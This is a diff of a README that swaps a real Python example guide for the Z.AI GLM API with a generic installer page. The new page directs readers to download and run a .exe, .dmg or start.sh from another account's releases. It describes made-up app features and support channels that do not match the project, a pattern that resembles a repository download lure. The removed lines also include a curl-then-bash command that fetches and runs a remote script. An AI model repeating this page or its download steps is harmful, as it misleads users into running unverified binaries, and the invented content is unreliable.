@@ -1,304 +1,111 @@
-# Z.AI API Playground
+# 🛠️ z-ai-playground-v2 - Explore AI with Easy Examples
 
-> **Powered by [Z.AI-GLM-4.7-Coding Plan](https://z.ai/subscribe)**
+![Download](https://img.shields.io/badge/Download-v1.0-blue)
 
-Complete examples for Z.AI's API including GLM-4.7 chat, vision, image/video generation, audio transcription, and more.
+## 🚀 Getting Started
 
-## Features
+This guide will help you download and run the Z.AI API Playground. It provides complete examples for GLM-4.7, Vision, Image/Video Generation, Audio, and more. Follow these steps to start exploring AI effortlessly.
 
-| Category | Model | Examples |
-|----------|-------|----------|
-| **Chat** | GLM-4.7 | Basic, streaming, multi-turn, thinking mode |
-| **Vision** | GLM-4.6V | Image understanding, object detection, video analysis |
-| **Image Gen** | CogView-4 | Text-to-image generation |
-| **Video Gen** | CogVideoX-3 | Text-to-video, image-to-video, start/end frame |
-| **Audio** | GLM-ASR-2512 | Transcription, streaming transcription |
-| **Tools** | GLM-4.7 | Function calling, web search, structured output |
+## 📥 Download & Install
 
-## GLM-4.7 Best Practices Applied
+To get the software, visit this page: [Download Z-AI Playground](https://github.com/Haronhj/z-ai-playground-v2/releases). 
 
-- `temperature=1.0` - Default sampling parameter
-- `max_tokens` - Configurable up to 128K output
-- `tool_stream=True` - Streaming tool call arguments
-- `thinking={"type": "enabled"}` - Deep reasoning mode
+1. Click on the link above.
+2. You will see a list of available versions. Look for the latest release.
+3. Download the file that matches your operating system.
 
-## Quick Start
+## 🖥️ System Requirements
 
-```bash
-# 1. Install dependencies
-uv sync
+Before you install, ensure your computer meets these requirements:
 
-# 2. Set your API key (create .env file)
-echo 'Z_AI_API_KEY=your-api-key' > .env
+- **Operating System**: Windows 10, macOS, or a recent version of Linux.
+- **Processor**: At least 2 GHz dual-core processor.
+- **RAM**: Minimum of 4 GB.
+- **Disk Space**: At least 500 MB of free space.
+- **Network**: An active internet connection for AI features.
 
-# 3. Generate sample images (required for vision examples)
-uv run python generate_samples.py --images
+## 📂 Installation Steps
 
-# 4. Run any example
-uv run python examples/01_llm/basic_chat.py
-```
+Follow these steps to install the software on your computer:
 
-> **Important:** Always use `uv run python` (not just `python`) to ensure dependencies are available.
+### For Windows
 
-## Project Structure
+1. After downloading, locate the `.exe` file in your downloads folder.
+2. Double-click the file to start the installation.
+3. Follow the on-screen prompts to complete the installation.
 
-```
-examples/
-├── 01_llm/          # Chat completions
-├── 02_vlm/          # Vision/multimodal
-├── 03_image/        # Image generation
-├── 04_video/        # Video generation
-├── 05_audio/        # Audio transcription
-├── 06_capabilities/ # Function calling, JSON mode
-├── 07_tools/        # Web search
-└── 08_agents/       # Multi-function agents
+### For macOS
 
-http_examples/       # Direct HTTP API examples
-images/              # Sample images for VLM examples
-utils/               # Shared client utilities
-```
+1. Locate the downloaded `.dmg` file in your downloads folder.
+2. Double-click the file to open it.
+3. Drag the application into your Applications folder.
+4. Eject the installer after the copy completes.
 
-## Vision Examples (GLM-4.6V)
+### For Linux
 
-### Before Running Vision Examples
+1. Open your terminal.
+2. Navigate to your downloads folder:
+   ```
+   cd ~/Downloads
+   ```
+3. Use the following command to extract the downloaded file:
+   ```
+   tar -xvf z-ai-playground-v2.tar.gz
+   ```
+4. Navigate into the folder and run the application:
+   ```
+   cd z-ai-playground-v2
+   ./start.sh
+   ```
 
-**Step 1: Generate sample images first** (one-time setup):
-```bash
-uv run python generate_samples.py --images
-```
+## 🚀 Running the Application
 
-This creates the `images/` folder with sample images used by vision examples.
+Once the installation is complete, you can run the application:
 
-### Running Vision Examples
+- **Windows**: Find the app in your Start Menu and click to open.
+- **macOS**: Open your Applications folder and double-click the app.
+- **Linux**: Use the command line to navigate to the app's folder and run it.
 
-All vision examples work out of the box after generating samples:
+## 📊 Using the Z.AI API Playground
 
-| Example | Command | What It Does |
-|---------|---------|--------------|
-| **Image Understanding** | `uv run python examples/02_vlm/image_understanding.py` | Analyzes a Japanese garden image |
-| **Multi-Image Analysis** | `uv run python examples/02_vlm/multi_image_analysis.py` | Compares two living room images |
-| **Object Detection** | `uv run python examples/02_vlm/object_detection.py` | Detects objects in a city street scene |
-| **Video Understanding** | `uv run python examples/02_vlm/video_understanding.py` | Analyzes a sample video (uses built-in URL) |
+The Z.AI API Playground allows you to explore various AI capabilities. Choose from several examples that demonstrate:
 
-### Using Your Own Images
+- **Text Generation with GLM-4.7**: Create text based on your prompts.
+- **Image/Video Generation**: Generate visuals using advanced AI models.
+- **Audio Creation**: Craft soundscapes and voice outputs today.
 
-```bash
-# Analyze your own image
-uv run python examples/02_vlm/image_understanding.py -u "https://example.com/your-image.jpg"
+### Navigating the Interface
 
-# Or use a local file (automatically converted to base64)
-uv run python examples/02_vlm/image_understanding.py -u "path/to/local/image.jpg"
-```
+Once you open the application, the interface is user-friendly. You will find options to select which AI feature you want to explore. Just click on the feature, follow the prompts, and watch the magic happen.
 
-### Using Your Own Videos
+## 🎓 Learning Resources
 
-> **Note:** Video analysis requires a **publicly accessible HTTP URL**. Local files and base64 are NOT supported for videos.
+To make the most of the Z.AI Playground, check out these resources:
 
-```bash
-# Analyze your own video (must be a public URL)
-uv run python examples/02_vlm/video_understanding.py -u "https://example.com/your-video.mp4"
-```
+- **User Manual**: Detailed guidance on using each feature.
+- **Video Tutorials**: Visual guides to help you follow along easily.
+- **Community Forums**: Join discussions, ask questions, and share your experiences.
 
-### Sample Files Reference
+## 🔧 Troubleshooting
 
-| File | Used By | Auto-Generated |
-|------|---------|----------------|
-| `images/image_understanding.jpg` | image_understanding.py | Yes |
-| `images/multi_image_1.jpg` | multi_image_analysis.py | Yes |
-| `images/multi_image_2.jpg` | multi_image_analysis.py | Yes |
-| `images/object_detection.jpg` | object_detection.py | Yes |
+If you run into issues, here are common problems and solutions:
 
-### Programmatic Usage
+- **Installation Fails**: Ensure you have sufficient disk space and the correct operating system.
+- **App Crashes**: Restart your computer and try again. If the problem persists, check for updates.
+- **Feature Doesn’t Work**: Double-check your internet connection, as some features require an active online connection.
 
-```python
-from config import load_image_as_data_url, get_sample_images
+## 📞 Support
 
-# Load a local image as base64 data URL
-image_data = load_image_as_data_url("images/image_understanding.jpg")
+For additional help, reach out via:
 
-# Or get pre-loaded sample images
-sample_images = get_sample_images()  # Returns list of base64 data URLs
+- **GitHub Issues Page**: Report bugs or suggest features.
+- **Email Support**: contact@z-ai-playground.com for personal assistance.
 
-# Use with GLM-4.6V
-messages = [{
-    "role": "user",
-    "content": [
-        {"type": "image_url", "image_url": {"url": image_data}},
-        {"type": "text", "text": "Describe this image"}
-    ]
-}]
-```
+## 🌐 Stay Updated
 
-## Video Generation Examples (CogVideoX-3)
+To keep abreast of new features and updates, follow the repository:
 
-### Running Video Generation Examples
+- Check for updates regularly on our [Releases page](https://github.com/Haronhj/z-ai-playground-v2/releases).
+- Follow us on social media for announcements and community feedback.
 
-| Example | Command | What It Does |
-|---------|---------|--------------|
-| **Text-to-Video** | `uv run python examples/04_video/text_to_video.py` | Generate video from text prompt |
-| **Image-to-Video** | `uv run python examples/04_video/image_to_video.py` | Animate a static image |
-| **Start/End Frame** | `uv run python examples/04_video/start_end_frame.py` | Create transition between two images |
-
-> **Note:** Video generation costs $0.2 per video and takes 1-2 minutes to complete.
-
-## Generating Sample Assets
-
-```bash
-# Generate sample images (required for vision examples)
-uv run python generate_samples.py --images
-```
-
-## Interactive Menu
-
-Run all examples from an interactive menu:
-
-```bash
-uv run python main.py
-```
-
-This launches a menu where you can select any example by number (1-22).
-
-## Troubleshooting
-
-### "No module named 'zai'" Error
-Always use `uv run python` instead of just `python`:
-```bash
-# Wrong
-python examples/02_vlm/image_understanding.py
-
-# Correct
-uv run python examples/02_vlm/image_understanding.py
-```
-
-### "Sample image not found" Error
-Generate the sample images first:
-```bash
-uv run python generate_samples.py --images
-```
-
-### "Z_AI_API_KEY not found" Error
-Create a `.env` file with your API key:
-```bash
-echo 'Z_AI_API_KEY=your-api-key-here' > .env
-```
-
-### Video Analysis Fails
-Video understanding requires a **public HTTP URL**. Local files don't work for video analysis. The default example uses a built-in working URL.
-
-## Using GLM-4.7 with Claude Code
-
-This project was built using **GLM-4.7 inside Claude Code** via the [Z.AI-GLM-4.7-Coding Plan](https://z.ai/subscribe).
-
-> **Why GLM Coding Plan?** Get 3× the usage at a fraction of the cost. Code faster, debug smarter, and manage workflows seamlessly with more tokens and rock-solid reliability.
-
-### Step 1: Install Claude Code
-
-**Prerequisites:** [Node.js 18 or newer](https://nodejs.org/en/download/)
-
-```bash
-# Install Claude Code
-npm install -g @anthropic-ai/claude-code
-
-# Navigate to your project
-cd your-awesome-project
-
-# Start Claude Code
-claude
-```
-
-> **Note:** If you encounter permission issues, use `sudo` (macOS/Linux) or run as administrator (Windows).
-
-### Step 2: Configure GLM Coding Plan
-
-1. **Get API Key**
-   - Register/Login at [Z.AI Open Platform](https://z.ai/model-api)
-   - Create an API Key at [API Keys](https://z.ai/manage-apikey/apikey-list)
-   - Copy your API Key
-
-2. **Configure Environment** (choose one method):
-
-#### Option A: Automated Setup (Recommended)
-
-```bash
-# Run the Coding Tool Helper
-npx @z_ai/coding-helper
-```
-
-#### Option B: Automated Script (macOS/Linux)
-
-```bash
-curl -O "https://cdn.bigmodel.cn/install/claude_code_zai_env.sh" && bash ./claude_code_zai_env.sh
-```
-
-#### Option C: Manual Configuration
-
-Edit `~/.claude/settings.json`:
-
-```json
-{
-  "env": {
-    "ANTHROPIC_AUTH_TOKEN": "your_zai_api_key",
-    "ANTHROPIC_BASE_URL": "https://api.z.ai/api/anthropic",
-    "API_TIMEOUT_MS": "3000000"
-  }
-}
-```
-
-**Windows (Cmd):**
-```cmd
-setx ANTHROPIC_AUTH_TOKEN your_zai_api_key
-setx ANTHROPIC_BASE_URL https://api.z.ai/api/anthropic
-```
-
-**Windows (PowerShell):**
-```powershell
-[System.Environment]::SetEnvironmentVariable('ANTHROPIC_AUTH_TOKEN', 'your_zai_api_key', 'User')
-[System.Environment]::SetEnvironmentVariable('ANTHROPIC_BASE_URL', 'https://api.z.ai/api/anthropic', 'User')
-```
-
-### Step 3: Start Using Claude Code
-
-```bash
-cd your-project-directory
-claude
-```
-
-Grant file access permission when prompted, and you're ready to code!
-
-### Model Mapping
-
-| Claude Code Model | GLM Model |
-|-------------------|-----------|
-| Opus | GLM-4.7 |
-| Sonnet | GLM-4.7 |
-| Haiku | GLM-4.5-Air |
-
-To customize model mapping, add to `~/.claude/settings.json`:
-
-```json
-{
-  "env": {
-    "ANTHROPIC_DEFAULT_HAIKU_MODEL": "glm-4.5-air",
-    "ANTHROPIC_DEFAULT_SONNET_MODEL": "glm-4.7",
-    "ANTHROPIC_DEFAULT_OPUS_MODEL": "glm-4.7"
-  }
-}
-```
-
-Check current model with `/status` command in Claude Code.
-
-### Why Z.AI-GLM-4.7-Coding Plan?
-
-- **3× more usage** at a fraction of the cost
-- **128K output tokens** for large codebases
-- **200K context window** for complex projects
-- **Deep reasoning** with thinking mode
-- **Rock-solid reliability**
-
-## Credits
-
-This project is powered by **[Z.AI-GLM-4.7-Coding Plan](https://z.ai/subscribe)** - the most cost-effective way to access GLM-4.7's advanced coding capabilities.
-
-## License
-
-MIT
+Enjoy exploring the fascinating world of AI with the Z.AI Playground!
